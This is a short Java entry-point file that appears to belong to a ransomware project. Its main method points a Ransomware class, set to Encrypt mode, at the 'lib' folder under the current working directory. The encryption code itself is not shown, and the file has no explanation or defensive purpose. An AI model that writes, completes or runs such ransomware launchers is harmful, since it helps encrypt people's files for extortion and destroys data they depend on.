import java.nio.file.Path;

public class Main {
    public static void main(String[] args) throws Exception {
        Path directory = Path.of(System.getProperty("user.dir"), "lib");
        Ransomware.setMode(Ransomware.Mode.Encrypt);
        Ransomware.initialize(directory);
    }
}



